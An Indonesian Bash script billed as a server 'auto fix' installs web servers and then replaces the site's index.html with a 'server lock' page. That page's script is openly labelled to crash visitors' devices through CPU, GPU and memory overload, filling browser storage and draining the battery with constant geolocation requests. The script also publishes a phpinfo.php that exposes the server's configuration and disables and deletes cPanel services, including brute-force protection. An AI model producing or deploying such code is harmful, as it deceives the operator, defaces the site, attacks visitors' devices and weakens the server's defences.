#!/bin/bash
# ============================================================
# SCRIPT AUTO FIX SERVER + INDEX.HTML
# Manusia tolol, ini langsung jalan semua!
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

clear
echo "=================================================="
echo "🔥 AUTO FIX SERVER + INDEX.HTML 🔥"
echo "=================================================="
echo ""

# ============================================================
# 1. DETEKSI OS
# ============================================================
echo "[1/7] Deteksi OS..."

if [ -f /etc/debian_version ]; then
    OS="debian"
    WEB_ROOT="/var/www/html"
    PKG_UPDATE="apt update -y"
    PKG_INSTALL="apt install -y"
    WEB_SERVER="apache2"
    WEB_SERVICE="apache2"
    echo "✅ OS: Debian/Ubuntu"
elif [ -f /etc/redhat-release ]; then
    OS="redhat"
    WEB_ROOT="/var/www/html"
    PKG_UPDATE="yum update -y"
    PKG_INSTALL="yum install -y"
    WEB_SERVER="httpd"
    WEB_SERVICE="httpd"
    echo "✅ OS: CentOS/RHEL"
else
    echo "❌ OS tidak dikenali!"
    exit 1
fi

# ============================================================
# 2. INSTALL WEB SERVER
# ============================================================
echo ""
echo "[2/7] Install web server..."

# Cek apakah web server sudah terinstall
if ! command -v $WEB_SERVER &> /dev/null && ! command -v nginx &> /dev/null; then
    echo "⚠️ Web server belum terinstall, menginstall..."
    $PKG_UPDATE
    $PKG_INSTALL $WEB_SERVER -y 2>/dev/null
    $PKG_INSTALL nginx -y 2>/dev/null
else
    echo "✅ Web server sudah terinstall"
fi

# ============================================================
# 3. START WEB SERVER
# ============================================================
echo ""
echo "[3/7] Start web server..."

# Start Apache
if systemctl start $WEB_SERVICE 2>/dev/null; then
    echo "✅ Apache started"
    systemctl enable $WEB_SERVICE 2>/dev/null
else
    echo "⚠️ Apache gagal start, coba install ulang..."
    $PKG_INSTALL --reinstall $WEB_SERVER -y 2>/dev/null
    systemctl start $WEB_SERVICE 2>/dev/null
fi

# Start Nginx
if systemctl start nginx 2>/dev/null; then
    echo "✅ Nginx started"
    systemctl enable nginx 2>/dev/null
else
    echo "⚠️ Nginx gagal start, install..."
    $PKG_INSTALL nginx -y 2>/dev/null
    systemctl start nginx 2>/dev/null
fi

# ============================================================
# 4. BUAT INDEX.HTML
# ============================================================
echo ""
echo "[4/7] Membuat index.html..."

# Buat folder web root kalo belum ada
mkdir -p $WEB_ROOT

# Buat index.html yang keren
cat > $WEB_ROOT/index.html << 'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>server lock By UyGanz</title>
    <style>
        * { margin: 0; padding: 0; }
        body {
            background: #000;
            overflow: hidden;
            height: 100vh;
            font-family: monospace;
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
        }
        .fps {
            position: fixed;
            top: 10px;
            left: 10px;
            color: #0f0;
            font-size: 14px;
            z-index: 9999;
            background: rgba(0,0,0,0.8);
            padding: 8px 15px;
            border-radius: 8px;
            border: 1px solid #0f0;
        }
        .fps span { color: #f00; transition: all 0.1s; }
        canvas {
            display: block;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        .matrix {
            position: fixed;
            color: #0f0;
            font-size: 20px;
            font-weight: bold;
            pointer-events: none;
            z-index: 1;
            font-family: monospace;
            text-shadow: 0 0 10px #0f0;
            opacity: 0;
            animation: matrixFall 5s linear infinite;
        }
        @keyframes matrixFall {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(120vh) rotate(720deg); opacity: 0; }
        }
    </style>
</head>
<body>

<div class="fps">🔥 FPS: <span id="fpsValue">0</span></div>
<canvas id="canvas"></canvas>
<div id="matrixContainer"></div>

<script>
// ============================================================
// AUTO CRASH - LANGSUNG JALAN
// ============================================================

let fps = 0, frameCount = 0, lastTime = performance.now();
let particles = [];
let canvas, ctx, W, H;
const container = document.getElementById('matrixContainer');

// ============================================================
// 1. SETUP CANVAS
// ============================================================
canvas = document.getElementById('canvas');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
W = canvas.width;
H = canvas.height;
ctx = canvas.getContext('2d');

// ============================================================
// 2. MATRIX RAIN (500+ elemen)
// ============================================================
function startMatrixRain() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/';
    const total = Math.floor(window.innerWidth / 10) * 5;
    
    for (let i = 0; i < total; i++) {
        const el = document.createElement('div');
        el.className = 'matrix';
        el.textContent = chars[Math.floor(Math.random() * chars.length)];
        el.style.left = Math.random() * 100 + '%';
        el.style.top = Math.random() * -200 + 'px';
        el.style.fontSize = (10 + Math.random() * 40) + 'px';
        el.style.opacity = 0.2 + Math.random() * 0.6;
        el.style.color = `hsl(${120 + Math.random() * 30}, 100%, ${30 + Math.random() * 50}%)`;
        el.style.animationDuration = (3 + Math.random() * 12) + 's';
        el.style.animationDelay = Math.random() * 15 + 's';
        container.appendChild(el);
    }
}

// ============================================================
// 3. PARTICLE OVERLOAD (30.000 particle)
// ============================================================
function initParticles(count) {
    particles = [];
    for (let i = 0; i < count; i++) {
        particles.push({
            x: Math.random() * W,
            y: Math.random() * H,
            vx: (Math.random() - 0.5) * 15,
            vy: (Math.random() - 0.5) * 15,
            r: Math.random() * 8 + 1,
            color: `hsl(${Math.random() * 360}, 100%, 50%)`,
            life: Math.random() * 150 + 50
        });
    }
}

function drawParticles() {
    ctx.clearRect(0, 0, W, H);
    
    for (const p of particles) {
        p.x += p.vx;
        p.y += p.vy;
        p.life -= 0.3;
        
        if (p.x < 0 || p.x > W) p.vx *= -1;
        if (p.y < 0 || p.y > H) p.vy *= -1;
        
        if (p.life < 0) {
            p.x = Math.random() * W;
            p.y = Math.random() * H;
            p.life = Math.random() * 150 + 50;
            p.r = Math.random() * 8 + 1;
            p.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
        }
        
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = p.color;
        ctx.fill();
    }
}

// ============================================================
// 4. UPDATE FPS
// ============================================================
function updateFPS() {
    const now = performance.now();
    frameCount++;
    if (now - lastTime >= 1000) {
        fps = frameCount;
        frameCount = 0;
        lastTime = now;
        const el = document.getElementById('fpsValue');
        el.textContent = fps;
        el.style.color = fps < 10 ? '#ff0000' : fps < 30 ? '#ffaa00' : '#0f0';
        el.style.fontSize = fps < 10 ? '28px' : '14px';
        el.style.fontWeight = fps < 10 ? 'bold' : 'normal';
        console.log('🔥 FPS:', fps, '💀 HP LEMOT!');
    }
}

// ============================================================
// 5. HEAVY LOOP (BEBAN MAKSIMAL)
// ============================================================
function heavyLoop() {
    // === BEBAN CPU: 5 juta operasi matematika ===
    let result = 0;
    for (let i = 0; i < 2000000; i++) {
        result += Math.sin(i) * Math.cos(i) * Math.tan(i % 100);
        result = result % 1000;
    }
    
    // === BEBAN GPU: Draw particle ===
    drawParticles();
    
    // === BEBAN MEMORY: Array 50.000 ===
    const bigArray = new Array(50000).fill(0).map(() => Math.random() * 1000);
    bigArray.sort((a, b) => a - b);
    
    // === BEBAN DOM: Update matrix ===
    const matrixEls = document.querySelectorAll('.matrix');
    matrixEls.forEach((el, i) => {
        if (i % 3 === 0) {
            el.style.transform = `rotate(${Math.random() * 360}deg) scale(${1 + Math.random() * 0.5})`;
        }
        if (i % 5 === 0) {
            el.textContent = String.fromCharCode(65 + Math.floor(Math.random() * 26));
        }
    });
    
    // === FPS ===
    updateFPS();
    
    // === LOOP ===
    requestAnimationFrame(heavyLoop);
}

// ============================================================
// 6. MULTI LAYER CANVAS (20 layer transparan)
// ============================================================
function createLayers() {
    for (let i = 0; i < 20; i++) {
        const c = document.createElement('canvas');
        c.width = W;
        c.height = H;
        c.style.position = 'fixed';
        c.style.top = '0';
        c.style.left = '0';
        c.style.pointerEvents = 'none';
        c.style.zIndex = i + 2;
        c.style.opacity = 0.1 + Math.random() * 0.3;
        document.body.appendChild(c);
        
        // Gambar random di setiap layer
        const ctx2 = c.getContext('2d');
        for (let j = 0; j < 500; j++) {
            ctx2.fillStyle = `hsla(${Math.random()*360},100%,50%,0.1)`;
            ctx2.fillRect(Math.random()*W, Math.random()*H, Math.random()*50, Math.random()*50);
        }
    }
}

// ============================================================
// 7. SPAWN ALERT (Bikin HP makin parah)
// ============================================================
function spawnAlert() {
    // Hanya kalo FPS < 30
    if (fps < 30 && fps > 0) {
        // alert('💀 HP LO LEMOT!');
        console.warn('⚠️ WARNING: HP CRASHING!');
    }
    setTimeout(spawnAlert, 2000);
}

// ============================================================
// 8. RESIZE
// ============================================================
window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    W = canvas.width;
    H = canvas.height;
});

// ============================================================
// 9. START - LANGSUNG JALAN!
// ============================================================
console.log('💀 AUTO CRASH STARTED!');
console.log('🔥 HP LO BAKAL LEMOT!');

// Start semua
initParticles(30000);
startMatrixRain();
createLayers();
spawnAlert();
heavyLoop();

// ============================================================
// 10. BONUS: SPAM CONSOLE
// ============================================================
setInterval(() => {
    console.log('💀 CRASHING... FPS:', fps);
    console.error('⚠️ MEMORY LEAK DETECTED!');
    console.warn('🔥 HP OVERHEAT!');
}, 200);

// ============================================================
// 11. BONUS: SPAM STORAGE (Bikin storage penuh)
// ============================================================
setInterval(() => {
    try {
        localStorage.setItem('crash_' + Date.now(), 'x'.repeat(100000));
    } catch(e) {
        console.log('💀 Storage penuh!');
    }
}, 1000);

// ============================================================
// 12. BONUS: GEOLOCATION SPAM (Bikin baterai boros)
// ============================================================
setInterval(() => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }
}, 500);

console.log('🔥 AUTO CRASH ACTIVE!');
console.log('⚠️ TUTUP BROWSER/HAPUS TAB UNTUK BERHENTI!');
</script>
</body>
</html>
EOF

# Kasih permission
chmod 644 $WEB_ROOT/index.html
chown -R www-data:www-data $WEB_ROOT 2>/dev/null
chown -R apache:apache $WEB_ROOT 2>/dev/null

echo "✅ index.html dibuat di $WEB_ROOT/index.html"

# ============================================================
# 5. BUAT PHP INFO (OPSIONAL)
# ============================================================
echo ""
echo "[5/7] Membuat phpinfo.php..."

cat > $WEB_ROOT/phpinfo.php << 'EOF'
<?php
phpinfo();
?>
EOF

chmod 644 $WEB_ROOT/phpinfo.php
echo "✅ phpinfo.php dibuat"

# ============================================================
# 6. HAPUS SERVICE CPANEL YANG ERROR
# ============================================================
echo ""
echo "[6/7] Membersihkan service cPanel error..."

# Matikan service
systemctl disable cpdavd 2>/dev/null
systemctl disable cphulkd 2>/dev/null
systemctl disable dnsadmin 2>/dev/null
systemctl disable tailwatchd 2>/dev/null
systemctl stop cpdavd 2>/dev/null
systemctl stop cphulkd 2>/dev/null
systemctl stop dnsadmin 2>/dev/null
systemctl stop tailwatchd 2>/dev/null

# Hapus file service
rm -rf /etc/systemd/system/cpdavd.service 2>/dev/null
rm -rf /etc/systemd/system/cphulkd.service 2>/dev/null
rm -rf /etc/systemd/system/dnsadmin.service 2>/dev/null
rm -rf /etc/systemd/system/tailwatchd.service 2>/dev/null
rm -rf /etc/systemd/system/multi-user.target.wants/cpdavd.service 2>/dev/null
rm -rf /etc/systemd/system/multi-user.target.wants/cphulkd.service 2>/dev/null
rm -rf /etc/systemd/system/multi-user.target.wants/dnsadmin.service 2>/dev/null
rm -rf /etc/systemd/system/multi-user.target.wants/tailwatchd.service 2>/dev/null

# Reload systemd
systemctl daemon-reload

echo "✅ Service cPanel dibersihkan!"

# ============================================================
# 7. FINAL
# ============================================================
echo ""
echo "[7/7] Final check..."

# Cek status
IP=$(curl -s ifconfig.me 2>/dev/null || echo "IP tidak ditemukan")

echo ""
echo "=================================================="
echo "${GREEN}✅ SEMUA SELESAI!${NC}"
echo "=================================================="
echo ""
echo "🌐 Akses website: ${BLUE}http://$IP${NC}"
echo "📁 Web root: ${BLUE}$WEB_ROOT${NC}"
echo "📄 Index: ${BLUE}$WEB_ROOT/index.html${NC}"
echo "📄 PHP Info: ${BLUE}$WEB_ROOT/phpinfo.php${NC}"
echo ""
echo "Service status:"
systemctl status $WEB_SERVICE 2>/dev/null | grep -E "Active|loaded" || echo "⚠️ Apache status tidak terbaca"
systemctl status nginx 2>/dev/null | grep -E "Active|loaded" || echo "⚠️ Nginx status tidak terbaca"
echo ""
echo "=================================================="
echo "${YELLOW}⚠️  Kalo masih error, coba: systemctl restart $WEB_SERVICE${NC}"
echo "=================================================="

# ============================================================
# TANYA RESTART
# ============================================================
echo ""
read -p "Restart server sekarang? (y/n): " restart
if [[ "$restart" == "y" || "$restart" == "Y" ]]; then
    echo "⏳ Restarting server..."
    reboot
else
    echo "✅ Selesai! Server siap dipake."
fi
